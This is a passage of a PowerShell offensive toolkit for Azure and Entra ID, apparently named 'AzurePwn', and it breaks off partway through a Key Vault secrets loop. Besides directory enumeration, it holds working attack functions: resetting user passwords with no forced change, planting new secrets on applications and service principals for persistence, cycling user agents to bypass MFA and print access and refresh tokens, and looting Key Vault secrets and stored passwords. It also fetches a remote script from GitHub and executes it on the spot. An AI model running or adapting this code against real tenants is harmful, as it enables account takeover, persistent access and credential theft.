            $apps = az ad app list --query '[].{Name: displayName, AppId: appId, ObjectId: id}' -o json | ConvertFrom-Json
            $ownedApps = foreach ($app in $apps) {
                $owners = az ad app owner list --id $app.ObjectId --query '[].id' -o tsv
                if ($owners -contains $userId) {
                    [PSCustomObject]@{
                        DisplayName = $app.Name
                        AppId = $app.AppId
                        ObjectId = $app.ObjectId
                    }
                }
            }

            if ($ownedApps) {
                $cliOutput = $ownedApps | Format-Table -AutoSize | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "No owned applications found for the user." -ForegroundColor Yellow
            }
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $ownedObjects = Get-MgUserOwnedObject -UserId $userId -All
            $apps = $ownedObjects | Where-Object { $_.AdditionalProperties.'@odata.type' -eq '#microsoft.graph.application' }
            $graphOutput = $apps | ForEach-Object {
                [PSCustomObject]@{
                    DisplayName = $_.AdditionalProperties['displayName']
                    AppId = $_.AdditionalProperties['appId']
                    ObjectId = $_.Id
                }
            } | Format-Table -AutoSize | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving owned applications: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query app details
function GetAppDetailsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Get App Details Query" -ForegroundColor Cyan
    Write-Host "Enter the app display name:" -ForegroundColor Yellow
    $appName = Read-Host

    Start-Sleep -Seconds 2  # Delay to ensure environment stability

    try {
        Clear-Host
        DisplayHeader
        Write-Host "AZ CLI output:" -ForegroundColor Magenta
        $cliOutput = az ad app list --query "[?displayName=='$appName'] | [0].{DisplayName:displayName, Application_ID:appId, Object_ID:id}" --output table | Out-String
        Write-Host $cliOutput
    }
    catch {
        Write-Host "Error retrieving app details: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query password policy
function PasswordPolicyQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Password Policy Query" -ForegroundColor Cyan
    Write-Host "This query will be performed using Microsoft Graph PowerShell Module." -ForegroundColor Yellow

    Start-Sleep -Seconds 2  # Delay to ensure environment stability

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Graph PS Module output:" -ForegroundColor Magenta
        $policy = Get-MgBetaDirectorySetting | Where-Object { $_.templateId -eq "5cf42378-d67d-4f36-ba46-e8b86229381d" } | ConvertTo-Json -Depth 50
        $output = $policy | Format-Table | Out-String
        Write-Host $output
    }
    catch {
        Write-Host "Error retrieving password policy: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query administrative units
function AdministrativeUnitsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Administrative Units Query" -ForegroundColor Cyan

    try {
        # Retrieve all Administrative Units
        $adminUnits = Get-MgDirectoryAdministrativeUnit
        $results = @()  # Initialize a collection to store the results

        # Retrieve all Directory Roles to avoid repetitive API calls
        $directoryRoles = Get-MgDirectoryRole

        # Iterate through each Administrative Unit
        foreach ($unit in $adminUnits) {
            Write-Host "Processing Administrative Unit: $($unit.DisplayName)" -ForegroundColor Blue

            try {
                # Get all Scoped Role Members for the current Administrative Unit
                $members = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $unit.Id

                # Retrieve all populated members (users) in the Administrative Unit
                $populatedMembers = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $unit.Id | Select-Object -ExpandProperty additionalProperties

                # Collect User Principal Names of populated members
                $populatedUserPrincipalNames = $populatedMembers | Where-Object { $_.userPrincipalName } | ForEach-Object { $_.userPrincipalName }

                # If Scoped Role Members exist, extract details
                foreach ($member in $members) {
                    # Extract the role member info (e.g., user name and details)
                    $roleMember = $member | Select-Object -ExpandProperty roleMemberInfo

                    # Retrieve the directory role details for the RoleId
                    $roleDetails = $directoryRoles | Where-Object { $_.Id -eq $member.RoleId }

                    # Extract the display name of the role, if available
                    $roleName = if ($roleDetails) { $roleDetails.DisplayName } else { "Unknown Role" }

                    # Add the extracted data to the results
                    $results += [pscustomobject]@{
                        AdministrativeUnitName = $unit.DisplayName
                        RoleName               = $roleName
                        RoleAssignedUsers      = $roleMember.DisplayName
                        AUPopulatedUsers       = ($populatedUserPrincipalNames -join ", ") # Join UPNs into a single string
                    }

                    # Check if the current user is part of the RoleAssignedUsers
                    if ($roleMember.DisplayName -eq (Get-MgUser -UserId "$graphModuleAccount").DisplayName) {
                        Write-Host "NOTICE: You are a role member in '$($unit.DisplayName)' as '$roleName'." -ForegroundColor Green
                    }
                }

                # If no Scoped Role Members exist but there are populated users, add them to results
                if (-not $members -and $populatedUserPrincipalNames) {
                    $results += [pscustomobject]@{
                        AdministrativeUnitName = $unit.DisplayName
                        RoleName               = "N/A"
                        RoleAssignedUsers      = "N/A"
                        AUPopulatedUsers       = ($populatedUserPrincipalNames -join ", ") # Join UPNs into a single string
                    }
                }

            } catch {
                Write-Error "Failed to retrieve members for Administrative Unit: $($unit.DisplayName). Error: $_"
            }
        }

        # Display the results as a table
        $output = $results | Format-Table -AutoSize | Out-String
        Write-Host $output

    } catch {
        Write-Host "Error retrieving administrative units: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query owned objects
function OwnedObjectsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Owned Objects Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    # Execute and print owned objects from selected tools
    try {
        Clear-Host
        DisplayHeader

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            if ($userId -eq $azureCliId) {
                Write-Host "Only works for current user!!!" -ForegroundColor Yellow
                $cliOutput = az ad signed-in-user list-owned-objects --output table | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "AZ CLI does not support querying other users' owned objects directly." -ForegroundColor Yellow
            }
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "Owned objects via Az PS Module not directly supported." -ForegroundColor Yellow
        }

        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $graphOutput = Get-MgUserOwnedObject -UserId $userId | Select-Object * -ExpandProperty additionalProperties | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving owned objects: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query role assignments
function RoleAssignmentsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Role Assignments Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az role assignment list --assignee "$userId" --all | Out-String
            Write-Host $cliOutput
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzRoleAssignment -ObjectId "$userId" | Format-list | Out-String
            Write-Host $psOutput
        }
        
        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            Write-Host "Graph PS Module does not directly support listing role assignments in this context." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving role assignments: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query available resources
function AvailableResourcesQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Available Resources Query" -ForegroundColor Cyan
    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az resource list --output table | Out-String
            Write-Host $cliOutput
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzResource | Format-Table | Out-String
            Write-Host $psOutput
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS does not support direct resource queries in this context." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "Error retrieving available resources: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query user information
function UserInfoQuery {
    Clear-Host
    DisplayHeader
    Write-Host "User Info Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Results:" -ForegroundColor Cyan

        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az ad user show --id "$userId" | Out-String
            Write-Host $cliOutput
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $psOutput = Get-AzADUser -ObjectId "$userId" | Format-List | Out-String
            Write-Host $psOutput
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $graphOutput = Get-MgUser -UserId "$userId" | Format-List | Out-String
            Write-Host $graphOutput
        }
    }
    catch {
        Write-Host "Error retrieving user info: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query user groups
function UserGroupsQuery {
    Clear-Host
    DisplayHeader
    Write-Host "User Groups Query" -ForegroundColor Cyan

    # Display logged-in users
    $accounts = @()
    $accountIds = @()
    if ($azureCliAccount -ne "Not logged in") { 
        $accounts += $azureCliAccount 
        $accountIds += $azureCliId
    }
    if ($azModuleAccount -ne "Not logged in") { 
        $accounts += $azModuleAccount 
        $accountIds += $azModuleId
    }
    if ($graphModuleAccount -ne "Not logged in") { 
        $accounts += $graphModuleAccount 
        $accountIds += $graphModuleId
    }

    # Show list and prompt for input
    for ($i = 0; $i -lt $accounts.Length; $i++) {
        Write-Host "$($i + 1). $($accounts[$i])" -ForegroundColor Yellow
    }

    Write-Host "Enter a number to select a user or type a custom Object ID:"
    $input = Read-Host

    # Determine user ID
    $userId = if ($input -match '^\d+$' -and [int]$input -le $accounts.Length) {
        $accountIds[$input - 1]
    } else {
        $input
    }

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        Write-Host "Results:" -ForegroundColor Cyan

        # Azure CLI
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $cliOutput = az ad user get-member-groups --id "$userId" --output table | Out-String
            Write-Host $cliOutput
        }

        # Az PowerShell Module
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            Write-Host "Enable/implement necessary logic for user: $userId" -ForegroundColor Yellow
            # Note: Add your specific logic here to fetch group memberships
        }

        # Graph PowerShell Module
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $groups = Get-MgUserMemberOf -UserId $userId -All
            $groupDetails = $groups | ForEach-Object {
                $groupInfo = Get-MgGroup -GroupId $_.Id
                [PSCustomObject]@{
                    DisplayName = $groupInfo.DisplayName
                    Id = $groupInfo.Id
                }
            } | Format-Table -AutoSize | Out-String
            Write-Host $groupDetails
        }
    }
    catch {
        Write-Host "Error retrieving user groups: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to query group members
function GroupMembersQuery {
    Clear-Host
    DisplayHeader
    Write-Host "Group Members Query" -ForegroundColor Cyan
    Write-Host "Enter a group name:" -ForegroundColor Yellow
    $groupName = Read-Host

    Write-Host "Select tool(s) to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader

        # Retrieve the group ID using the group name
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            $groupId = az ad group show --group "$groupName" --query id -o tsv
            if ($groupId) {
                Write-Host "AZ CLI output:" -ForegroundColor Magenta
                $cliOutput = az ad group member list --group "$groupId" --output table | Out-String
                Write-Host $cliOutput
            } else {
                Write-Host "Invalid group name for AZ CLI." -ForegroundColor Red
            }
        }

        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            $group = Get-AzADGroup -DisplayName "$groupName"
            if ($group) {
                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
                $psOutput = Get-AzADGroupMember -GroupObjectId $group.Id | Format-Table | Out-String
                Write-Host $psOutput
            } else {
                Write-Host "Invalid group name for Az PS Module." -ForegroundColor Red
            }
        }

        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            $group = Get-MgGroup -Filter "displayName eq '$groupName'"
            if ($group) {
                Write-Host "Graph PS Module output:" -ForegroundColor Magenta
                $members = Get-MgGroupMember -GroupId $group.Id
                $graphOutput = $members | ForEach-Object {
                    $user = Get-MgUser -UserId $_.Id
                    [PSCustomObject]@{
                        DisplayName = $user.DisplayName
                        Id = $_.Id
                    }
                } | Format-Table -AutoSize | Out-String
                Write-Host $graphOutput
            } else {
                Write-Host "Invalid group name for Graph PS Module." -ForegroundColor Red
            }
        }
    }
    catch {
        Write-Host "Error retrieving group members: $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the queries menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to handle raw PowerShell command execution
function RawCommandPrompt {
    Clear-Host
    DisplayHeader
    Write-Host "Raw Command Prompt" -ForegroundColor Cyan
    Write-Host "Enter 'exit' to return to the queries menu." -ForegroundColor Yellow

    while ($true) {
        try {
            $command = Read-Host -Prompt "PS"
            if ($command -eq "exit") {
                break
            }
            Clear-Host
            DisplayHeader
            Write-Host "Raw Command Prompt" -ForegroundColor Cyan
            Write-Host "PS: $command" -ForegroundColor Yellow
            $output = Invoke-Expression $command 2>&1 | Out-String
            Write-Host $output
        }
        catch {
            Write-Host "Error executing command: $_" -ForegroundColor Red
        }
    }
}

# Attacks menu structure
function AttacksMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Attacks Menu" -ForegroundColor Cyan
        Write-Host "1. Reset a User's Password via Graph PS Module"
        Write-Host "2. Set New Secret for Application via Graph PS Module"
        Write-Host "3. Set New Secret for Service Principal"
        Write-Host "4. Try to bypass MFA with MFASweep"
        Write-Host "5. Try to bypass MFA with GraphRunner"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                ResetUserPassword
            }
            "2" {
                SetNewSecretForApplication
            }
            "3" {
                SetNewSecretForServicePrincipal
            }
            "4" {
                MFASweep
            }
            "5" {
                GraphRunnerBypassMFA
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to reset a user's password via Graph
function ResetUserPassword {
    Clear-Host
    DisplayHeader
    Write-Host "Reset a User's Password via Graph PS Module" -ForegroundColor Cyan
    Write-Host "Enter the user's email or user ID:" -ForegroundColor Yellow
    $userId = Read-Host

    Write-Host "Enter the new password:" -ForegroundColor Yellow
    $password = Read-Host

    try {
        $params = @{
            passwordProfile = @{
                forceChangePasswordNextSignIn = $false
                forceChangePasswordNextSignInWithMfa = $false
                password = $password
            }
        }
        Update-MgUser -UserId $userId -BodyParameter $params
        Write-Host "Password reset successfully for user $userId." -ForegroundColor Green
    }
    catch {
        Write-Host "Error resetting password for user "$userId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to set a new secret to an application
function SetNewSecretForApplication {
    Clear-Host
    DisplayHeader
    Write-Host "Add New Secret for an Application via Graph PS Module" -ForegroundColor Cyan
    Write-Host "Careful here. You need the Object ID, not the Application (client) ID!!!" -ForegroundColor Yellow
    Write-Host "Enter the application's Object ID:" -ForegroundColor Yellow
    $appId = Read-Host

    try {
        $passwordCred = @{
            displayName = 'Created via AzurePwn'
        }
        # Create a new password credential
        $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
        
        # Print the new password
        Write-Host "The new secret for the Application is: $($newPassword.SecretText)" -ForegroundColor Green
    }
    catch {
        Write-Host "Error setting new secret for application ID "$appId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to set a new secret for a service principal
function SetNewSecretForServicePrincipal {
    Clear-Host
    DisplayHeader
    Write-Host "Set New Secret for a Service Principal" -ForegroundColor Cyan
    Write-Host "Careful here. You need the Object ID, not the Application ID!!!" -ForegroundColor Yellow
    Write-Host "Enter the service principal's Object ID:" -ForegroundColor Yellow
    $spId = Read-Host

    Write-Host "Select tool(s) to use to set the secret:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    Write-Host "3. Graph PS Module" -ForegroundColor Yellow
    Write-Host "4. All" -ForegroundColor Yellow
    $toolChoice = Read-Host

    try {
        if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
            Write-Host "AZ CLI output:" -ForegroundColor Magenta
            $newSecret = az ad sp credential reset --id $spId --append --query 'password' -o tsv
            Write-Host "The new secret for the service principal is: $newSecret" -ForegroundColor Green
        }
        
        if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
            Write-Host "AZ PS Module output:" -ForegroundColor Magenta
            $newPassword = New-AzADSpCredential -ObjectId $spId -DisplayName 'Created via AzurePwn'
            Write-Host "The new secret for the service principal is: $($newPassword.Secret)" -ForegroundColor Green
        }
        
        if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
            Write-Host "Graph PS Module output:" -ForegroundColor Magenta
            $passwordCred = @{
                displayName = 'Created via AzurePwn'
            }
            $newPassword = Add-MgServicePrincipalPassword -ServicePrincipalId $spId -PasswordCredential $passwordCred
            Write-Host "The new secret for the service principal is: $($newPassword.SecretText)" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Error setting new secret for application ID "$spId": $_" -ForegroundColor Red
    }

    Write-Host "`nPress any key to return to the attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Function to test various user agents to acquire an access token
function GraphRunnerBypassMFA {
    Clear-Host
    DisplayHeader
    Write-Host "Testing User Agent Combinations to bypass MFA to get Graph Access Token via Dafthack's Graphrunner" -ForegroundColor Cyan
    $username = Read-Host -Prompt "Username"
    $password = Read-Host -Prompt "Password"

    # Reset global token variable
    $global:tokens = $null

    # Define the device and browser combinations
    $devices = @('Mac', 'Windows', 'AndroidMobile', 'iPhone')
    $browsers = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')

    # Label for nested loop
    :OuterLoop foreach ($device in $devices) {
        foreach ($browser in $browsers) {
            try {
                Write-Host "Attempting with Device: $device, Browser: $browser" -ForegroundColor Cyan
                
                # Attempt to acquire graph tokens using the generated user agent
                $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
                
                # Checking if the global variable $tokens has been set
                if ($global:tokens -and $global:tokens.access_token) {
                    Write-Host "Successfully retrieved Graph Access Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
                    Write-Host "You can use it in the auth menu or via Connect-MgGraph -AccessToken <TOKEN>" -ForegroundColor DarkGreen
                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
                    Write-Host "Successfully retrieved Refresh Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
                    Write-Host "Use TokenTacticsV2 (Invoke-RefreshTo...) to exchange it for an Access Token to a FOCI app or directly to collect AzureHound data" -ForegroundColor DarkGreen
                    Write-Host "Refresh Token: $($global:tokens.refresh_token)" -ForegroundColor DarkMagenta
                    break OuterLoop  # Exit both loops if a token is retrieved
                } else {
                    Write-Host "Failed to retrieve token with $device and $browser combination" -ForegroundColor Red
                }
            }
            catch {
                Write-Host "Error with Device: $device, Browser: $browser | Error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

    Write-Host "`nTesting completed. Press any key to return to the menu..."
    [void][System.Console]::ReadKey($true)
}

<# 
Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
MIT License

Copyright (c) 2020 dafthack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
#>
function MFASweep {
    Clear-Host
    DisplayHeader
    Write-Host "MFA Sweep" -ForegroundColor Cyan

    # Download and execute MFASweep
    if (Get-Command -Name Invoke-MFASweep -ErrorAction SilentlyContinue) {
        Write-Host "Invoke-MFASweeps is already available." -ForegroundColor Green
    } else {
        Write-Host "Invoke-MFASweep is not available." -ForegroundColor Red 
        Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
        iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
    }

    Invoke-MFASweep
    
    Write-Host "`nPress any key to return to the Attacks menu..."
    [void][System.Console]::ReadKey($true)
}

# Login menu structure
function LootMenu {
    while ($true) {
        Clear-Host
        DisplayHeader
        Write-Host "Loot Menu" -ForegroundColor Cyan
        Write-Host "1. Key Vaults"
        Write-Host "2. Storage"
        Write-Host "3. Container Apps"
        Write-Host "4. Hail Mary via Get-AzPasswords from MicroBurst (Az PS Module)"
        Write-Host "B. Return to Main Menu"

        $userInput = Read-Host -Prompt "Select an option"
        switch ($userInput) {
            "1" {
                LootKeyvaults
            }
            "2" {
                LootStorageMenu
            }
            "3" {
                LootContainerAppsMenu
            }
            "4" {
                LootAzPasswords
            }
            "B" {
                return
            }
            default {
                Write-Host "Invalid selection, please try again."
                Write-Host "`nPress any key to continue..."
                [void][System.Console]::ReadKey($true)
            }
        }
    }
}

# Function to query available Key Vaults and interact with secrets
function LootKeyvaults {
    Clear-Host
    DisplayHeader
    Write-Host "Available Key Vaults Query" -ForegroundColor Cyan

    Write-Host "Select tool to use:" -ForegroundColor Yellow
    Write-Host "1. Azure CLI" -ForegroundColor Yellow
    Write-Host "2. Az PS Module" -ForegroundColor Yellow
    $toolChoice = Read-Host

    Start-Sleep -Seconds 2

    try {
        Clear-Host
        DisplayHeader
        $keyVaultList = @()

        # List key vaults
        try {
            if ($toolChoice -eq "1") {
                Write-Host "AZ CLI output:" -ForegroundColor Magenta
                $cliOutput = az keyvault list --query "[].name" -o tsv
                $keyVaultList = $cliOutput -split "`n"
            } elseif ($toolChoice -eq "2") {
                Write-Host "AZ PS Module output:" -ForegroundColor Magenta
                $psOutput = Get-AzKeyVault | Select-Object -ExpandProperty VaultName
                $keyVaultList = $psOutput -split "`n"
            } else {
                Write-Host "Invalid selection, returning to queries menu." -ForegroundColor Red
                return
            }
        } catch {
            Write-Host "Error retrieving Key Vaults: $_" -ForegroundColor Red
        }

        if ($keyVaultList.Count -gt 0) {
            while ($true) {
                Write-Host "Select a Key Vault to explore:" -ForegroundColor Yellow
                for ($i = 0; $i -lt $keyVaultList.Count; $i++) {
                    Write-Host "$($i + 1). $($keyVaultList[$i])" -ForegroundColor Green
                }
                Write-Host "B. Back to tool selection" -ForegroundColor Cyan
                Write-Host "M. Return to main menu" -ForegroundColor Cyan

                $selectedOption = Read-Host "Enter a number to select a vault, 'B', or 'M'"

                if ($selectedOption -eq "B") {
                    break
                }

                if ($selectedOption -eq "M") {
                    return
                }

                if ($selectedOption -ge 1 -and $selectedOption -le $keyVaultList.Count) {
                    $selectedVault = $keyVaultList[$selectedOption - 1]
                    Write-Host "`nExploring secrets in '$selectedVault' Key Vault..." -ForegroundColor Yellow

                    # List secrets
                    try {
                        $secrets = if ($toolChoice -eq "1") {
                            az keyvault secret list --vault-name $selectedVault --query "[].name" -o tsv
                        } elseif ($toolChoice -eq "2") {
                            Get-AzKeyVaultSecret -VaultName $selectedVault | Select-Object -ExpandProperty Name
                            }
                        
                        $secretList = $secrets -split "`n"
                        if ($secretList.Count -gt 0) {
                            while ($true) {
                                Write-Host "Select a secret to view its content:" -ForegroundColor Yellow
                                for ($i = 0; $i -lt $secretList.Count; $i++) {
